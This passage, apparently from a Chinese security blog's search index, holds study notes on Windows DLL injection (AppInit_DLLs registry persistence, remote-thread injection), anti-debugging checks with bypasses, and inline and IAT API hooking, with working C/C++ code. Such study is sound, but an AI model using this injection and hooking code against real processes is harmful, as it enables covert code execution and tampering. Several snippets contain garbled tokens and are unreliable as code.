&amp;dwType, (LPBYTE)csBuf, &amp;dwSize); int nSize = strlen(csAppInitValue); //添加Dll路径 lsRet = RegSetValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, REG_SZ, (const BYTE *)csAppInitValue, nSize + 1); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Set Key Failed1....\\n&quot;); return -1; &#125; //将LoadAppInit_DLLs设为1 lsRet = RegSetValueExA(hKey, &quot;LoadAppInit_DLLs&quot;, 0, REG_DWORD, (const BYTE *)&amp;dwLoadAppInitValue, sizeof(DWORD)); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Set Key Failed2....\\n&quot;); return -1; &#125; RegCloseKey(hKey); getchar(); return 0;&#125;","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"远程线程注入","slug":"远程线程注入","date":"2023-07-09T16:00:00.000Z","updated":"2024-05-12T13:11:13.019Z","comments":true,"path":"2023/07/10/远程线程注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/10/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"​ 在Dll注入技术学习中，远程线程注入可以说是最容易理解的一种注入技术了。通过这种技术，我们也可以触类旁通其他注入技术。","text":"​ 在Dll注入技术学习中，远程线程注入可以说是最容易理解的一种注入技术了。通过这种技术，我们也可以触类旁通其他注入技术。 原理现在有三个程序：目标注入进程、注入加载进程以及Dll。 我们都知道一个exe文件会去加载自己所需要的Dll去运行，通常是一些系统Dll，如果有需要，也会加载自己编写的Dll。这里就出现了我们的利用点，也就是windows肯定提供了API供我们使用去加载Dll。那么接下来的思路就是利用API函数加载Dll并执行Dll中的函数。 执行思路：通过目标进程pid获取进程句柄 -&gt; 在目标进程开辟空间 -&gt; 在开辟空间写入Dll的路径 -&gt; 目标进程中创建远程线程加载Dll。 API获取进程句柄123456//返回值是进程句柄HANDLE OpenProcess( [in] DWORD dwDesiredAccess,//一般获取权限为PROCESS_ALL_ACCESS权限 [in] BOOL bInheritHandle,//不重要 [in] DWORD dwProcessId//目标进程pid); 加载Dll（重要）1234//返回值是Dll句柄HMODULE LoadLibraryA( [in] LPCSTR lpLibFileName //加载的Dll名称); 获取Dll的导出函数12345//返回值是导出函数地址FARPROC GetProcAddress( [in] HMODULE hModule, //Dll句柄 [in] LPCSTR lpProcName //导出函数名称); 开辟内存空间12345678//返回值是开辟出的内存地址LPVOID VirtualAllocEx( [in] HANDLE hProcess,//进程句柄 [in, optional] LPVOID lpAddress,//NULL [in] SIZE_T dwSize,//内存大小 [in] DWORD flAllocationType,//MEM_COMMIT [in] DWORD flProtect//PAGE_EXECUTE_READWRITE); 写入内存空间12345678//如果该函数成功，则返回值为非零值BOOL WriteProcessMemory( [in] HANDLE hProcess, //目标进程句柄 [in] LPVOID lpBaseAddress,//分配到的内存首地址 [in] LPCVOID lpBuffer,//写入的内容 [in] SIZE_T nSize,//写入的大小 [out] SIZE_T *lpNumberOfBytesWritten//NULL); 创建远程线程12345678910//HANDLE CreateRemoteThread( [in] HANDLE hProcess, //要在其中创建线程的进程句柄 [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, //NULL [in] SIZE_T dwStackSize, //0 [in] LPTHREAD_START_ROUTINE lpStartAddress, //回调函数 [in] LPVOID lpParameter, //分配的内存空间 [in] DWORD dwCreationFlags,//0 [out] LPDWORD lpThreadId//NULL); 代码这里获取进程pid偷懒了，是直接在任务管理器中查看的。如果想实现自动获取，可以通过进程遍历来实现。 123456789101112131415161718192021222324252627282930#include&lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; //进程标识符 DWORD pid = 32064; //返回值为目标进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid); //获取LoadLibary函数的加载地址 //返回值是Kernel32的句柄（也可以用GetModuleHandle实现） HMODULE hMod = LoadLibrary(&quot;Kernel32.dll&quot;); //返回LoadLibraryA的地址 FARPROC fun = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); //此路径修改为你自己的测试dll char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1&quot;; //在目标进程中开辟内存空间 LPVOID address = VirtualAllocEx(hProcess, NULL, strlen(DllPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE); //将要注入的dll路径写入目标进程 WriteProcessMemory(hProcess, address, DllPath, strlen(DllPath), NULL); //目标程序创建线程 CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fun, address, 0, NULL);&#125; 首先开启测试注入进程 接着运行Dll注入进程，记得关闭杀毒软件 在注入进程也可以找到我们的Dll 进阶实现我们可以依赖可信任进程进行注入，例如注入Services.exe这个进程，首先先将a.dll远线程注入到Service.exe中，再利用a.dll将b.dll远线程注入的待注入进程中。 这里偷一张图 a.dll注入成功后还可以“功成身退”，利用FreeLibraryAndExitThread()把自己卸载掉并且退出线程。","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"反调试跟踪与反反调试","slug":"反跟踪调试","date":"2022-10-11T16:00:00.000Z","updated":"2024-05-12T13:00:12.918Z","comments":true,"path":"2022/10/12/反跟踪调试/","permalink":"https://e1ectr0nlc.github.io/2022/10/12/%E5%8F%8D%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95/","excerpt":"来总结一下学过的反调试技术。","text":"来总结一下学过的反调试技术。 进程状态IsDebuggerPresent()相信学习反调试都是从这个函数入手的，这个函数会查询进程环境块(PEB)中的IsDebugged标志。如果进程没有运行在调试器环境中，函数返回0；如果调试附加了进程，函数返回一个非零值。 实际上调用IsDebuggerPresent()会检查PEB结构体中偏移为0x2的BeingDebugge标志位，用来表示进程是否处于被调试状态。 1234BOOL CheckDebug()&#123; return IsDebuggerPresent();&#125; NtQueryInformationProcess()我们只需要关注这个函数的第二个参数即可 123456789BOOL CheckDebug()&#123; int debugPort = 0; HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); //如果进程正在被调试，则返回调试端口，否则返回0 NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL); return debugPort != 0;&#125; 这里再提一嘴CheckRemoteDebuggerPresen这个API，它再往下调用也会用到NtQueryInformationProcess，所以两者绕过可以是一样的。 NtGlobalFlags由于调试器中启动进程与正常模式下启动进程有些不同，所以它们创建内存堆的方式也不同。系统使用PEB结构偏移量0x68处的NtGlobalFlags，来决定如何创建堆结构。如果这个位置的值为0x70，我们就知道进程正运行在调试器中。 123456789101112BOOL CheckDebug()&#123; int result = 0; __asm &#123; mov eax, fs:[30h] mov eax, [eax + 68h] and eax, 0x70 mov result, eax &#125; return result != 0;&#125; TEB结构体中还有很多指向堆的标志位可以来判断是否存在调试器环境下，有兴趣可以看这篇文章26种对付反调试的方法 -腾讯云开发者社区-腾讯云 (tencent.com) STARTUPINFO双击启动程序时，实际是通过CreateProcess函数创建启动的 123456789101112BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation); 我们关注倒数第二个参数就可以，A表示Ascii码。explorer启动程序时，会把倒数第2个参数STARTUPINFO结构体中的值设置为0，但调试器启动程序的时候不会，所以我们可以通过判断该结构体中的某些值是否为0来判断是否被调试 1234567891011121314151617181920typedef struct _STARTUPINFOA &#123; DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOA, *LPSTARTUPINFOA; 我们选择几个属性来进行反调试检查 12345678910bool CheckDebug STARTUPINFO()&#123; STARTUPINFO si =&#123;&#125;; GetStartupInfol(&amp;si);if (si.dw||si.dwy||si.dwXSize||si.dwYSize)&#123; printf(&quot;%x %x %x %x n&quot;,si.dwy,si.dwy,si.dwrsize,si.dwysize): return true;. return false; &#125;&#125; 可以选择修改函数返回值来绕过。 调试环境这里就是查找调试器的特征值，如果找到就退出 窗口检测查找当前系统中运行的程序窗口名称是否包含敏感程序来进行反调试。常用的函数有FindWindow、EnumWindows。FindWindow可以查找符合指定类名或窗口名的窗口句柄。 1234567891011BOOL CheckDebug()&#123; if (FindWindowA(&quot;OLLYDBG&quot;, NULL)!=NULL || FindWindowA(&quot;WinDbgFrameClass&quot;, NULL)!=NULL || FindWindowA(&quot;QWidget&quot;, NULL)!=NULL) &#123; return TRUE; &#125; else &#123; return FALSE; &#125;&#125; 绕过可以可以使用插件来隐藏窗口，或者为调试器改名。 进程检测遍历系统所有进程，如果存在调试器就退出。 实现方法很简单，获取系统中所有进程的快照，接着一一对比就行。 1234567891011121314151617181920212223BOOL CheckDebug()&#123; DWORD ID; DWORD ret = 0; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hProcessSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL bMore = Process32First(hProcessSnap, &amp;pe32); while(bMore) &#123; if (stricmp(pe32.szExeFile, &quot;OllyDBG.EXE&quot;)==0 || stricmp(pe32.szExeFile, &quot;OllyICE.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;x64_dbg.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;windbg.exe&quot;)==0 || stricmp(pe32.szExeFile, &quot;ImmunityDebugger.exe&quot;)==0) &#123; return TRUE; &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); &#125; CloseHandle(hProcessSnap); return FALSE;&#125; 调试器行为正常运行程序时不会有下断点这个操作，会被当成异常去处理。只有使用调试器时才会有下断点的操作，本质上是修改运行的进程中的代码，在调试器中运行和直接运行在细节上会有一些不同，因此可以检测出调试器的存在。 软件断点这里检查软件断点有两种思路。一种是检查自己的缓冲区是否出现了0xcc这个机器码，另外一种就是crc检验，查看自己的代码是否被修改了。 下面贴出两种思路的实现方式和绕过 检查字节码 1234567891011121314151617181920212223242526BOOL CheckDebug()&#123; PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS32 pNtHeaders; PIMAGE_SECTION_HEADER pSectionHeader; DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL); pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage; pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders-&gt;Signature) + sizeof(IMAGE_FILE_HEADER) + (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader); DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage; DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData; BOOL Found = FALSE; __asm &#123; cld mov edi,dwAddr mov ecx,dwCodeSize mov al,0CCH repne scasb jnz NotFound mov Found,1NotFound: &#125; return Found;&#125; 检查crc校验码（需要提前计算好） 1234567891011121314151617181920212223242526272829303132DWORD CalcFuncCrc(PUCHAR funcBegin, PUCHAR funcEnd)&#123; DWORD crc = 0; for (; funcBegin &lt; funcEnd; ++funcBegin) &#123; crc += *funcBegin; &#125; return crc;&#125;#pragma auto_inline(off)VOID DebuggeeFunction()&#123; int calc = 0; calc += 2; calc &lt;&lt;= 8; calc -= 3;&#125;VOID DebuggeeFunctionEnd()&#123;&#125;;#pragma auto_inline(on)DWORD g_origCrc = 0x2bd0;int main()&#123; DWORD crc = CalcFuncCrc((PUCHAR)DebuggeeFunction, (PUCHAR)DebuggeeFunctionEnd); if (g_origCrc != crc) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; return 0;&#125; 对于这两种技术来说，都不是很好绕过。对于通用的方法，我觉得可以在程序中的汇编指令的判断语句中打补丁更改跳转条件去绕过。对于crc校验码，可以修改计算cec的返回值，或者修改全局变量与返回值相等。 硬件断点在Windows x86架构中，开发人员在检查和调试代码时使用了一组调试寄存器。这些寄存器允许在访问内存读取或写入时中断程序执行并将控制传输到调试器。 DR0-DR3 -断点寄存器 DR4，DR5 -储藏 DR6 -调试状态 DR7 – 调试控制 所以同时最多只能设置4个硬件断点，如果没有硬件断点，那么DR0、DR1、DR2、DR3这4个寄存器的值都为0。 123456789101112BOOL CheckDebug()&#123; CONTEXT context; HANDLE hThread = GetCurrentThread(); context.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(hThread, &amp;context); if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3!=0) &#123; return TRUE; &#125; return FALSE; &#125; 当然这也只有设置硬件断点才会被检查出来。 时钟检测当程序自己运行没有附件调试器时，肯定做什么都直接快速，而不像调试器一样跑一条动一条。时钟检测技术就是通过计算关键内容运行时间差异来判断进程是否处于被调试状态。同时程序在虚拟机中的运行速度也比正常速度慢，所以时钟检测技术一般也用于反虚拟机&#x2F;反模拟器技术。计算运行时差的方式一般有两种：读取CPU时钟计数器、时间计数相关API。 CPU计数器 1234567891011121314151617181920212223bool CheckDebug_RDTSC()&#123;int64t t1=0,t2=0;int lo=0,hi=0;__asm&#123; rdtsc mov [lo],eax mov [hi],edx&#125;t1=((int64_t)1o)|((int64_t)hi&lt;32);__asm&#123; rdtsc mov[lo],eax mov [hi],edx &#125;t2 = ((int64_t)1o)|((int64_t)hi &lt;32);printf(&quot;t2-t1=%x\\n&quot;,t2 -t1)://不同的CPU该差值不同，还有可能发生线程切换使差值大于一般情况，：//所以谨慎使用这种反调试方法return t2 - t1 &gt; 0x100;&#125; 只要保证两次rdtsc运行结束后结果相同即可。 时间API 这些API也是一种反调试手段，这些API有：QueryPerformanceCounter、GetTickCount、GetSystemTime、GetLocalTime等。这里介绍一种QueryPerformanceCounter的使用 123456789bool CheckDebug_QueryPerformanceCounter()&#123; LARGE_INTEGER startTime endTime; QueryPerformanceCounter(&amp;startTime): printf(&quot;检测&quot;); QueryPerformanceCounter(&amp;endTime): printf(&quot;%x\\n&quot;,endTime.QuadPart - startTime.QuadPart); return endTime.QuadPart - startTime.QuadPart &gt; 0x500; &#125; 我们可以改变函数调用结果，使两次调用时间相同。（注意：一般这些时间API也会用于其他用途，所以除非明确知道所有的该API调用都是用来反调试，否则不要随便HOOK。） 异常处理在正常运行的进程中发生异常时，操作系统会接受异常，调用程序中注册的SEH处理。而在调试器进程中，那么调试器就会先于SEH接受异常消息，让调试器去处理异常信息。利用该特征可判断进程是正常运行还是调试运行，然后根据不同的结果执行不同的操作，这就是利用异常处理机制不同的反调试原理。 常见的异常有：https://msdn.microsoft.com/zh-tw/library/aa915076.aspx 如果一个异常发生而没有注册异常处理程序（或者已经注册但没有处理这样的异常），kernel32!UnhandledExceptionFilter()函数将被调用。可以使用kernel32!SetUnhandledExceptionFilter()来注册一个自定义的未处理异常过滤器。但是如果程序在调试器下运行，自定义的过滤器将不会被调用，异常将被传递给调试器。因此，如果未处理的异常过滤器被注册，并且控制被传递给它，那么这个进程就不是在调试器下运行。 处理方法可以看一下这篇文章：https://www.52pojie.cn/thread-933123-1-1.html 123456789101112131415161718192021LONG UnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionInfo)&#123; PCONTEXT ctx = pExceptionInfo-&gt;ContextRecord; ctx-&gt;Eip += 3; // Skip \\xCC\\xEB\\ return EXCEPTION_CONTINUE_EXECUTION;&#125; bool Check()&#123; bool bDebugged = true; SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)UnhandledExceptionFilter); __asm &#123; int 3 jmp near being_debugged &#125; bDebugged = false; being_debugged: return bDebugged;&#125; TLS回调函数TLS 回调函数为开发者提供了一种灵活的机制，可以在程序加载时或者线程创建时执行特定的操作，用于初始化、资源管理、异常处理等方面在Windows操作系统中，TLS回调函数是通过TLS回调表来管理的。这些回调函数通常在DLL文件中实现，并通过动态链接库（DLL）的入口点DllMain函数进行注册。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &lt;windows.h&gt; void NTAPI __stdcall TLS_CALLBACK1(PVOID DllHandle, DWORD dwReason, PVOID Reserved); #ifdef _M_IX86#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;)#pragma comment (linker, &quot;/INCLUDE:__tls_callback&quot;)#else#pragma comment (linker, &quot;/INCLUDE:_tls_used&quot;)#pragma comment (linker, &quot;/INCLUDE:_tls_callback&quot;)#endifEXTERN_C#ifdef _M_X64#pragma const_seg (&quot;.CRT$XLB&quot;)const#else#pragma data_seg (&quot;.CRT$XLB&quot;)#endif PIMAGE_TLS_CALLBACK _tls_callback[] = &#123; TLS_CALLBACK1,0&#125;;#pragma data_seg ()#pragma const_seg () #include &lt;iostream&gt; void NTAPI __stdcall TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; if (IsDebuggerPresent()) &#123; printf(&quot;TLS_CALLBACK: Debugger Detected!\\n&quot;); &#125; else &#123; printf(&quot;TLS_CALLBACK: No Debugger Present!\\n&quot;); &#125;&#125; int main(int argc, char* argv[])&#123; printf(&quot;233\\n&quot;); return 0;&#125; 由操作系统或者运行时库（如 C 运行时库）所启动的一些线程，用于执行一些初始化或其他任务。在这些线程中，TLS 回调函数会先于main函数调用。 要在程序中使用TLS，必须为TLS数据单独建一个数据段，用相关数据填充此段，并通知链接器为TLS数据在PE文件头中添加数据。_tls_callback[]数组中保存了所有的TLS回调函数指针。数组必须以NULL指针结束，且数组中的每一个回调函数在程序初始化时都会被调用，程序员可按需要添加。但程序员不应当假设操作系统已何种顺序调用回调函数。如此则要求在TLS回调函数中进行反调试操作需要一定的独立性。 这个程序就会多出来一个.tls段 双进程守护一个进程只能被调试器附加一次。利用这一点可以自己先调试运行自己，防止被另一个调试器继续调试。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;windows.h&quot; int DebugMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow); int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)&#123; if(!IsDebuggerPresent()) //区分调试进程与被调试进程，以执行不同的代码。 &#123; return DebugMain(hInstance,hPrevInstance,lpCmdLine,nCmdShow); &#125; __asm(&quot;int $3&quot;); MessageBox(0,&quot;这是一个简单的例子&quot;,&quot;TraceMe&quot;,0); return 0;&#125; int DebugMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow) //调试进程主函数&#123; char filename[MAX_PATH]; GetModuleFileName(0,filename,MAX_PATH); //获取自身文件名 STARTUPINFO si=&#123;0&#125;; GetStartupInfo(&amp;si); PROCESS_INFORMATION pi=&#123;0&#125;; if(!CreateProcess(filename,NULL,NULL,NULL,FALSE,DEBUG_PROCESS|DEBUG_ONLY_THIS_PROCESS,NULL,NULL,&amp;si,&amp;pi)) //创建被调试进程 &#123; return 0; &#125; BOOL WhileDoFlag=TRUE; DEBUG_EVENT DBEvent ; DWORD dwState; while (WhileDoFlag) &#123; WaitForDebugEvent (&amp;DBEvent, INFINITE); dwState = DBG_EXCEPTION_NOT_HANDLED ; switch (DBEvent.dwDebugEventCode) &#123; case CREATE_PROCESS_DEBUG_EVENT: dwState = DBG_CONTINUE ; break; case EXIT_PROCESS_DEBUG_EVENT : WhileDoFlag=FALSE; break ; case EXCEPTION_DEBUG_EVENT: switch (DBEvent.u.Exception.ExceptionRecord.ExceptionCode) &#123; case EXCEPTION_BREAKPOINT: &#123; dwState = DBG_CONTINUE ; break; &#125; &#125; break; &#125; ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, dwState) ; &#125; CloseHandle(pi.hProcess) ; CloseHandle(pi.hThread) ; return 0;&#125; 创建出两个一样的进程，只不过一个作为调试器，一个作为被调试进程，可以使用异常来进行控制程序执行。","categories":[{"name":"代码保护","slug":"代码保护","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"PE--Hook","slug":"Hook方法","date":"2022-09-11T16:00:00.000Z","updated":"2024-05-12T13:21:28.934Z","comments":true,"path":"2022/09/12/Hook方法/","permalink":"https://e1ectr0nlc.github.io/2022/09/12/Hook%E6%96%B9%E6%B3%95/","excerpt":"Hook各种API函数实现自己的功能","text":"Hook各种API函数实现自己的功能 Inline Hook实现原理实现Inline Hook可以理解为修改程序的执行流，到另外一块内存中执行我们需要的操作，结束之后返回到原来的地方接着执行程序原本的操作。在这里需要考虑的问题有以下几点： 如何找到跳转的地址； 如何保护现场以及还原执行流； 如果内存页不可写如何解决。 代码编写思路使用JMP指令来进行跳转操作（无条件跳转就是好用）。但是JMP后的地址（操作数）如何寻找？ JMP的目标地址是相对于下一条指令的位置进行计算，计算公式为：JMP 后面的地址（操作数） &#x3D; 目的地址 - 源地址 - 5。其中，5 是 JMP 指令的字节数。 接着考虑还原函数的地址，我们JMP到自定义函数后，执行完自定义函数的内容，接着就需要还原执行流恢复到原函数中。还原地址 &#x3D; 获取下一条指令地址（原函数地址+5） - 分配到的内存的地址 - 指令长度（5） 代码实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;iostream&gt;// 用于跳转到MyMessageBoxA的指令，0xE9代表JMP指令BYTE JmpOriginal[5] = &#123; 0xE9, 0, 0, 0, 0 &#125;; // 存储原始MessageBoxA的前5个字节BYTE OldCode[5] = &#123; 0 &#125;; // MessageBoxA的函数地址FARPROC MessageBoxAddress;// 还原函数地址void* Trampoline; // 自定义的MessageBoxA函数int WINAPI MyMessageBoxA(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)&#123; printf(&quot;MessageBoxA 已经被Hook\\n&quot;); // 打印被Hook的信息 // 返回原函数调用原始的MessageBoxA，这里需要类型转换 int ret = ((int (WINAPI*)(HWND, LPCTSTR, LPCTSTR, UINT))Trampoline)(hWnd, lpText, lpCaption, uType); return ret;&#125;void InlineHook()&#123; // 加载user32.dll模块 HMODULE hModule_User32 = LoadLibraryA(&quot;user32.dll&quot;); // 获取MessageBoxA的函数地址 MessageBoxAddress = GetProcAddress(hModule_User32, &quot;MessageBoxA&quot;); // 计算跳转到自定义函数的地址 DWORD JmpAddress = (DWORD)MyMessageBoxA - (DWORD)MessageBoxAddress - 5; // 将跳转地址复制到JmpOriginal的第二个字节 memcpy(&amp;JmpOriginal[1], &amp;JmpAddress, 4); // 读取并保存MessageBoxA的前5个字节 ReadProcessMemory(GetCurrentProcess(), MessageBoxAddress, OldCode, 5, NULL); // 分配10个字节的内存空间用来放入跳转回原函数的指令 Trampoline = VirtualAlloc(NULL, 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // 复制MessageBoxA的前5个字节 memcpy(Trampoline, OldCode, 5); // 计算还原函数的地址（原函数地址+5获取下一条指令地址后-分配内存的地址-指令长度） DWORD jmpBackAddr = (DWORD)MessageBoxAddress + 5 - (DWORD)Trampoline - 5; // JMP memcpy((void*)((DWORD)Trampoline + 5), &amp;JmpOriginal[0], 5); // MessageBoxA 函数中的下一条指令地址。 memcpy((void*)((DWORD)Trampoline + 6), &amp;jmpBackAddr, 4); DWORD dwOldProtect; // 修改MessageBoxA的前5个字节的页属性，使其可读可写可执行 VirtualProtect(MessageBoxAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); // 替换MessageBoxA的前5个字节为跳转到MyMessageBoxA的指令 WriteProcessMemory(GetCurrentProcess(), MessageBoxAddress, &amp;JmpOriginal[0], 5, NULL); // 恢复MessageBoxA的前5个字节的原始页属性 VirtualProtect(MessageBoxAddress, 5, dwOldProtect, &amp;dwOldProtect);&#125;void main()&#123; InlineHook(); // 实施Inline Hook MessageBoxA(NULL, &quot;Hello World&quot;, &quot;Title&quot;, MB_OK); // 调用MessageBoxA函数&#125; 大概流程就是将MessageBoxA的地址先通过WriteProcessMemory改为自定义函数的地址，同时开辟空间写入原函数的第一条指令和跳转回原函数的地址指令，接着等到自定义函数执行结束后作为函数指针调用原函数。 IAT Hook实现原理思路与Inline Hook大同小异。在Inline Hook中，我们关注的是JMP跳转后再跳转回去，而在IAT Hook中，我们只需要关注如何将自定义函数地址替换IAT函数地址即可，不需要自己来实现跳来跳去。配合一些DLL注入技术，就可以达到任意API函数Hook了。 代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// dllmain.cpp : 定义 DLL 应用程序的入口点。&quot;#include &lt;windows.h&gt;//创建与Messagebox相同的函数指针,注意要设置相同的函数参数typedef int (WINAPI *PfnMsgA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);PfnMsgA g_OldPfnMsgA = nullptr; //定义一个指向原先messagebox函数的空指针(nullptr)//解析PE文件结构//获取当前的ImagBase(基址)HMODULE hModImageBase = GetModuleHandle(NULL);//获取DOS头PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)(DWORD)hModImageBase; //获取NT头DWORD dwTemp = (DWORD)pDosHead + (DWORD)pDosHead-&gt;e_lfanew;PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)dwTemp; //获取标准PE头PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp; pNtHead-&gt;FileHeader; //获取扩展PE头PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp; pNtHead-&gt;OptionalHeader;//找到导入表的偏移(RVA)DWORD dwExportLocal=pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;//获取导入表PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)GetModuleHandle(NULL) + dwExportLocal); //定义自己设置的Messagebox函数int WINAPI MyMessageBox(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; char szHookText[] = &quot;Hook成功&quot;; if (g_OldPfnMsgA != nullptr) &#123; //调用原函数 return g_OldPfnMsgA(hWnd, szHookText, lpCaption, uType); &#125; return 0;&#125;//设置IATHookvoid SetIatHook()&#123; MessageBoxA(NULL, &quot;开始进行HOOK&quot;, NULL, NULL); //定义一个指向hook地址的空指针 PVOID pHookAddress = nullptr; //将要hook的地址指向Messagebox函数 pHookAddress = GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); if (nullptr == pHookAddress) &#123; OutputDebugString(TEXT(&quot;获取函数地址失败&quot;)); MessageBoxA(NULL, &quot;获取函数地址失败HOOK&quot;, NULL, NULL); return; &#125; //指向旧函数的指针 g_OldPfnMsgA = (PfnMsgA)pHookAddress; //寻找IAT表的位置. PIMAGE_IMPORT_DESCRIPTOR pCurrent = pImport; //导入表的子表,也就是IAT存储函数地址的表 DWORD *pFirstThunk; //遍历导入表 while (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != NULL) &#123; //找到IAT表的偏移地址 dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(NULL); //指向IAT表的指针 pFirstThunk = (DWORD *)dwTemp; while (*pFirstThunk != NULL) &#123; //遍历IAT表里的子表,若指针指向的是旧函数的地址,则将其修改成我们的函数地址 if (*pFirstThunk == (DWORD)g_OldPfnMsgA) &#123; DWORD oldProtected; //设置该内存区域属性为可写可读可执行 VirtualProtect(pFirstThunk, 0x1000, PAGE_EXECUTE_READWRITE, &amp;oldProtected); //将旧函数地址修改成自己的函数地址 dwTemp = (DWORD)MyMessageBox; memcpy(pFirstThunk, (DWORD *)&amp;dwTemp, 4); //还原保护属性 VirtualProtect(pFirstThunk, 0x1000, oldProtected, &amp;oldProtected); &#125; //遍历IAT表 pFirstThunk++; &#125; //遍历导入表 pCurrent++; &#125;&#125;//恢复导入表void UnIatHook()&#123; MessageBoxA(NULL, &quot;开始进行HOOK&quot;, NULL, NULL); PVOID pHookAddress = nullptr; pHookAddress = MyMessageBox; if (nullptr == pHookAddress) &#123; OutputDebugString(TEXT(&quot;获取函数地址失败&quot;)); MessageBoxA(NULL, &quot;恢复函数地址失败HOOK&quot;, NULL, NULL); return; &#125; PIMAGE_IMPORT_DESCRIPTOR pCurrent = pImport; DWORD* pFirstThunk; //指向 //遍历导入表 while 